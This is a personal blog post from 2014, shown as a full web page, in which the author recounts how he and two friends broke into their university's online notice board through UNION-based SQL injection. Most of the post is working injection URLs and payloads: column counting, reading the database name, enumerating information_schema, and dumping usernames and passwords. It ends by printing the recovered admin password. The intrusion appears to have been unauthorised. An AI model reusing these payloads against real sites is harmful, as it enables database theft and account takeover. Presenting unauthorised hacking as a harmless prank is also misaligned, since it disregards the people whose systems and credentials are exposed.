<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="A blog where I rarely write my learnings and findings.">
  <link rel="stylesheet" href="https://nagesh.blog/styles/index.css" />
  <title>
How we hacked our university notice board?
</title>
  <script type="text/javascript">
    if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
      document.documentElement.classList.add('dark')
    } else {
      document.documentElement.classList.remove('dark')
    }
  </script>
</head>

<body
  class="flex flex-col h-screen antialiased bg-white dark:bg-gray-900 box-border">
  <header class="border-0 border-t-4 border-b border-gray-300 border-solid dark:border-gray-700 border-t-cyan-600 dark:border-t-cyan-500">
    <nav class="flex items-center px-4 my-3 md:px-0 md:mx-auto md:w-3/4 md:max-w-3xl xl:max-w-4xl gap-4">
      <h1 class="mr-auto text-3xl font-extrabold text-cyan-600 dark:text-cyan-500"><a href="/">My Blog</a></h1>
      <a class="font-medium text-gray-900 dark:text-gray-100" href="/about">About</a>
      <button id="theme-toggle" type="button"
        class="p-2 bg-gray-100 rounded-lg text-cyan-600 dark:text-cyan-500 dark:bg-gray-700" role="button" aria-label="Toggle dark/light theme button">
        <svg id="theme-toggle-dark-icon" class="hidden w-6 h-6" fill="currentColor" viewBox="0 0 20 20"
          xmlns="http://www.w3.org/2000/svg">
          <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path>
        </svg>
        <svg id="theme-toggle-light-icon" class="hidden w-6 h-6" fill="currentColor" viewBox="0 0 20 20"
          xmlns="http://www.w3.org/2000/svg">
          <path
            d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z"
            fill-rule="evenodd" clip-rule="evenodd"></path>
        </svg>
      </button>
    </nav>
  </header>
  <main class="flex flex-col self-center w-full px-4 md:px-0 md:w-3/4 md:max-w-3xl xl:max-w-4xl grow">
    
<section name="blog-details">
  <div class="flex flex-col items-center justify-center">
    <h1 class="mt-8 text-3xl font-extrabold text-center text-blue-700 md:text-4xl dark:text-blue-400 leading-8">
      How we hacked our university notice board?
    </h1>
    <ul class="my-4">
      
      <li
        class="inline-flex items-center px-3 py-0.5 rounded-full text-sm font-medium bg-pink-100 dark:bg-slate-500 text-pink-800 dark:text-gray-100">
        exploitation</li>
      
      <li
        class="inline-flex items-center px-3 py-0.5 rounded-full text-sm font-medium bg-pink-100 dark:bg-slate-500 text-pink-800 dark:text-gray-100">
        SQLi</li>
      
      <li
        class="inline-flex items-center px-3 py-0.5 rounded-full text-sm font-medium bg-pink-100 dark:bg-slate-500 text-pink-800 dark:text-gray-100">
        web</li>
      
    </ul>
    <div class="flex text-sm font-semibold text-gray-500 space-x-1 dark:text-gray-400">
      <time>10 July 2014</time><span aria-hidden="true"> Â· </span><span>5 min read</span>
    </div>
  </div>
  <div class="mx-auto my-6 prose dark:prose-invert max-w-none prose-indigo prose-lg prose-h1:text-3xl prose-h2:text-2xl prose-h3:text-xl">
    <p>It's been nearly 3 months since my last post. Today I thought It will be helpful for the guys who are interested in Cyber Security, If I write about UNION Based SQLi that we did on our university notice board.
A little learning part before we jump on to exploitation.</p>
<pre style="background-color:#282c34;color:#abb2bf;"><code><span># Just selecting 1 2 and 3
</span><span>mysql&gt; select 1,2,3;
</span><span>+---+---+---+
</span><span>| 1 | 2 | 3 |
</span><span>+---+---+---+
</span><span>| 1 | 2 | 3 |
</span><span>+---+---+---+
</span><span>
</span><span># database() is a MySQL function to get current database name.
</span><span>mysql&gt; select database();
</span><span>+-----------------+
</span><span>| database()      |
</span><span>+-----------------+
</span><span>| UNIONBased_SQLi |
</span><span>+-----------------+
</span><span>
</span><span># Just selecting 1,database(),3
</span><span>mysql&gt; select 1,database(),3;
</span><span>+---+-----------------+---+
</span><span>| 1 | database()      | 3 |
</span><span>+---+-----------------+---+
</span><span>| 1 | UNIONBased_SQLi | 3 |
</span><span>+---+-----------------+---+
</span><span>
</span><span># group_concat() is a MySQL function which concatenates all the rows
</span><span>mysql&gt; select group_concat(username,&quot;-&quot;,password) from users;
</span><span>+---------------------------------------------------+
</span><span>| group_concat(username,&quot;-&quot;,password)               |
</span><span>+---------------------------------------------------+
</span><span>| admin-admin@onb,N090001-rgukt123,N090002-rgukt123 |
</span><span>+---------------------------------------------------+
</span><span>
</span><span># Example of a MySQL UNION operator.
</span><span>mysql&gt; select 1,2,3 UNION select 4,5,6;
</span><span>+---+---+---+
</span><span>| 1 | 2 | 3 |
</span><span>+---+---+---+
</span><span>| 1 | 2 | 3 |
</span><span>| 4 | 5 | 6 |
</span><span>+---+---+---+
</span><span>
</span><span># UNION only works when two select statements have the same no.of columns.
</span><span>mysql&gt; select 1,2,3 UNION select 5,6;
</span><span>ERROR: The used SELECT statements have a different number of columns
</span><span>
</span><span># To nullify the result of LHS select statement I appended a condition 1=0
</span><span> which is false. So the results include only RHS select statement results.
</span><span>mysql&gt; select username from users where sno=1 and 1=0 UNION select 1;
</span><span>+----------+
</span><span>| username |
</span><span>+----------+
</span><span>| 1        |
</span><span>+----------+
</span></code></pre>
<p>Good, now let's have a glance at why we started this.</p>
<p>After doing brute-force attack on a web page for getting flag in a <a href="https://ctftime.org/ctf-wtf/">CTF</a>, we thought It would give us admin rights If we can do the same attack on our notice board too. But later we realized that we can't just get the admin password by a filthy brute-force attack.</p>
<p>So we explored that website a bit and noticed that there is a page <strong>notice_view.php?id=1</strong> which takes <strong>id</strong> as GET parameter.</p>
<p><img src="https://nagesh.blog/blog/how-we-hacked-our-online-notice-board/onb.png" alt="notice_view.php page" /></p>
<p>As we are web developers we came to an estimation that the backend MySQL query might be</p>
<pre style="background-color:#282c34;color:#abb2bf;"><code><span>select * from tablename where somecolumnname=$_GET[&quot;id&quot;];
</span></code></pre>
<p>Yeah... That one seems compromising and we just gave it a shot with our best injection payload i.e (single quote) into the GET parameter id. Viola!!</p>
<pre style="background-color:#282c34;color:#abb2bf;"><code><span>You have an error in your SQL syntax; check the manual that corresponds
</span><span>to your MySQL server version for the right syntax to use near &#39;&#39;&#39; at line 1
</span></code></pre>
<p>Yes! This is vulnerable &amp; we can proceed with exploitation. The best part starts now.</p>
<p>Our next step is to find database name that is used for storing passwords. Exciting isn't it? And we used the below payload</p>
<pre style="background-color:#282c34;color:#abb2bf;"><code><span>1 and 1=0 UNION select 1,2,3,4,5 --
</span></code></pre>
<p>So the resultant query becomes</p>
<pre style="background-color:#282c34;color:#abb2bf;"><code><span>select * from sometablename where
</span><span>somecolumnname=1 and 1=0 UNION select 1,2,3,4,5 --;
</span></code></pre>
<p>That payload resulted in an error</p>
<pre style="background-color:#282c34;color:#abb2bf;"><code><span>The used SELECT statements have a different number of columns
</span></code></pre>
<p>Yeah it worked. To apply union on 2 SQL query's both must have same no.of columns. But here we didn't know the no.of columns, so to find no.of columns we tried imagining from 1 to some number until which we will not get an SQL error. We used below payloads, and 3rd one made it!</p>
<pre style="background-color:#282c34;color:#abb2bf;"><code><span>http://10.2.42.242/ONB/notice_view.php?id=1 and 1=0 UNION select 1--
</span><span>http://10.2.42.242/ONB/notice_view.php?id=1 and 1=0 UNION select 1,2--
</span><span>http://10.2.42.242/ONB/notice_view.php?id=1 and 1=0 UNION select 1,2,3--
</span></code></pre>
<p><img src="https://nagesh.blog/blog/how-we-hacked-our-online-notice-board/injected.png" alt="First Injection point" /></p>
<p>So the backend query which is fetching notices is selecting 3 columns, but the web page is displaying only 2 &amp; 3 (So these columns are vulnerable) and anything we inject in those columns that will display the result of that injected query on web page.</p>
<p>Cool, so now we can inject a code that will print database name on web page. There is a MySQL function <strong>database()</strong> which will display the current selected database. So we can use that function in any of the columns 2 (or) 3.</p>
<pre style="background-color:#282c34;color:#abb2bf;"><code><span>http://10.2.42.242/ONB/notice_view.php?id=1 and 1=0 UNION select 1,database(),3--
</span></code></pre>
<p>And result of this query is..</p>
<p><img src="https://nagesh.blog/blog/how-we-hacked-our-online-notice-board/database.png" alt="Database name being displayed on page" /></p>
<p>We have the database name <strong>Notices</strong>, now we have to find the table name for that we will use the mysql default Database which stores information of all the databases in it. So we have to extract all the information related to the database <strong>Notices</strong>. In order to do so we have used this payload</p>
<pre style="background-color:#282c34;color:#abb2bf;"><code><span>http://10.2.42.242/ONB/notice_view.php?id=1 and
</span><span>1=0 UNION select 1,group_concat(TABLE_NAME),3 from information_schema.TABLES
</span><span>where TABLE_SCHEMA=&#39;Notices&#39; --
</span></code></pre>
<p>And the result is</p>
<p><img src="https://nagesh.blog/blog/how-we-hacked-our-online-notice-board/tables.png" alt="Table names being displayed on page" /></p>
<p>Now we got all the tables in <strong>Notices</strong> Database and those are <strong>notices, users</strong>. This 'users' table seems interesting and we chose to see the contents of 'users' table first. But before that we should know the columns names of that table, information_schema is our friend now.</p>
<pre style="background-color:#282c34;color:#abb2bf;"><code><span>http://10.2.42.242/ONB/notice_view.php?id=1 and 1=0 UNION
</span><span>select 1,group_concat(COLUMN_NAME),3 from information_schema.COLUMNS where
</span><span>TABLE_NAME=&#39;users&#39; AND TABLE_SCHEMA=&#39;Notices&#39;--
</span></code></pre>
<p><img src="https://nagesh.blog/blog/how-we-hacked-our-online-notice-board/columns.png" alt="Column names being displayed on page" /></p>
<p>Now we just need to print password column from that table, used below payload.</p>
<pre style="background-color:#282c34;color:#abb2bf;"><code><span>http://10.2.42.242/ONB/notice_view.php?id=1 and 1=0
</span><span>UNION select 1, group_concat(username, &quot;-&quot;, password), 3 from users --
</span></code></pre>
<p>Result is...</p>
<p><img src="https://nagesh.blog/blog/how-we-hacked-our-online-notice-board/passwords.png" alt="Passwords being displayed on page" /></p>
<p>Ah! Finally, the admin password is on page and it is: <strong>admin@onb</strong></p>
<p>And in this post I keep on mentioning we. So we are</p>
<p><a href="https://www.facebook.com/H4rryp0tt3r7">Nageswara Rao Podilapu (Me)</a><br>
<a href="https://www.facebook.com/anesh.parvatha">Anesh Parvatha</a><br>
<a href="https://www.facebook.com/bharath.hussy">Ambati Bharath</a></p>

    <hr/>
  </div>
  <script src="https://utteranc.es/client.js"
          repo="H4rryp0tt3r/h4rryp0tt3r.github.io"
          id="utterances-box"
          issue-term="title"
          theme="github-light"
          crossorigin="anonymous"
          async>
  </script>
</section>

  </main>
  <footer
    class="flex flex-col items-center justify-center py-4 border-t border-gray-200 border-solid w-100 bg-slate-100 dark:bg-gray-700 dark:border-gray-600">
    <ul class="flex my-4 text-white dark:text-gray-100">
      <li class="p-3 m-2 rounded-full bg-cyan-600 dark:bg-cyan-500">
        <a target="_blank" rel="noreferrer" href="https://github.com/H4rryp0tt3r" role="link" aria-label="Link to my github profile">
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true"
            role="img" class="w-5" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24">
            <g fill="none">
              <path fill-rule="evenodd" clip-rule="evenodd"
                d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385c.6.105.825-.255.825-.57c0-.285-.015-1.23-.015-2.235c-3.015.555-3.795-.735-4.035-1.41c-.135-.345-.72-1.41-1.23-1.695c-.42-.225-1.02-.78-.015-.795c.945-.015 1.62.87 1.845 1.23c1.08 1.815 2.805 1.305 3.495.99c.105-.78.42-1.305.765-1.605c-2.67-.3-5.46-1.335-5.46-5.925c0-1.305.465-2.385 1.23-3.225c-.12-.3-.54-1.53.12-3.18c0 0 1.005-.315 3.3 1.23c.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23c.66 1.65.24 2.88.12 3.18c.765.84 1.23 1.905 1.23 3.225c0 4.605-2.805 5.625-5.475 5.925c.435.375.81 1.095.81 2.22c0 1.605-.015 2.895-.015 3.3c0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"
                fill="currentColor" />
            </g>
          </svg>
        </a>
      </li>
      <li class="p-3 m-2 rounded-full bg-cyan-600 dark:bg-cyan-500">
        <a target="_blank" rel="noreferrer" href="https://www.linkedin.com/in/h4rryp0tt3r/" role="link" aria-label="Link to my LinkedIn profile">
          <svg class="w-5 h-5 fill-current" role="img" viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg">
            <g>
              <path
                d="M218.123122,218.127392 L180.191928,218.127392 L180.191928,158.724263 C180.191928,144.559023 179.939053,126.323993 160.463756,126.323993 C140.707926,126.323993 137.685284,141.757585 137.685284,157.692986 L137.685284,218.123441 L99.7540894,218.123441 L99.7540894,95.9665207 L136.168036,95.9665207 L136.168036,112.660562 L136.677736,112.660562 C144.102746,99.9650027 157.908637,92.3824528 172.605689,92.9280076 C211.050535,92.9280076 218.138927,118.216023 218.138927,151.114151 L218.123122,218.127392 Z M56.9550587,79.2685282 C44.7981969,79.2707099 34.9413443,69.4171797 34.9391618,57.260052 C34.93698,45.1029244 44.7902948,35.2458562 56.9471566,35.2436736 C69.1040185,35.2414916 78.9608713,45.0950217 78.963054,57.2521493 C78.9641017,63.090208 76.6459976,68.6895714 72.5186979,72.8184433 C68.3913982,76.9473153 62.7929898,79.26748 56.9550587,79.2685282 M75.9206558,218.127392 L37.94995,218.127392 L37.94995,95.9665207 L75.9206558,95.9665207 L75.9206558,218.127392 Z M237.033403,0.0182577091 L18.8895249,0.0182577091 C8.57959469,-0.0980923971 0.124827038,8.16056231 -0.001,18.4706066 L-0.001,237.524091 C0.120519052,247.839103 8.57460631,256.105934 18.8895249,255.9977 L237.033403,255.9977 C247.368728,256.125818 255.855922,247.859464 255.999,237.524091 L255.999,18.4548016 C255.851624,8.12438979 247.363742,-0.133792868 237.033403,0.000790807055">
              </path>
            </g>
          </svg>
        </a>
      </li>
      <li class="p-3 m-2 rounded-full bg-cyan-600 dark:bg-cyan-500">
        <a target="_blank" rel="noreferrer" href="mailto:nagesh.podilapu@gmail.com" role="link" aria-label="Link to send an email to me">
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true"
            role="img" class="w-5" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24">
            <g fill="none">
              <path fill-rule="evenodd" clip-rule="evenodd"
                d="M12 0C5.372 0 0 5.373 0 12s5.372 12 12 12c6.627 0 12-5.373 12-12S18.627 0 12 0zm.14 19.018c-3.868 0-7-3.14-7-7.018c0-3.878 3.132-7.018 7-7.018c1.89 0 3.47.697 4.682 1.829l-1.974 1.978v-.004c-.735-.702-1.667-1.062-2.708-1.062c-2.31 0-4.187 1.956-4.187 4.273c0 2.315 1.877 4.277 4.187 4.277c2.096 0 3.522-1.202 3.816-2.852H12.14v-2.737h6.585c.088.47.135.96.135 1.474c0 4.01-2.677 6.86-6.72 6.86z"
                fill="currentColor"></path>
            </g>
          </svg>
        </a>
      </li>
    </ul>
    <p class="mb-4 text-gray-600 text-semibold dark:text-gray-300">
      2022 - Nagesh Podilapu
    </p>
  </footer>
  <script type="text/javascript" src="https://nagesh.blog/javascript/dark-mode.js" async></script>
</body>

</html>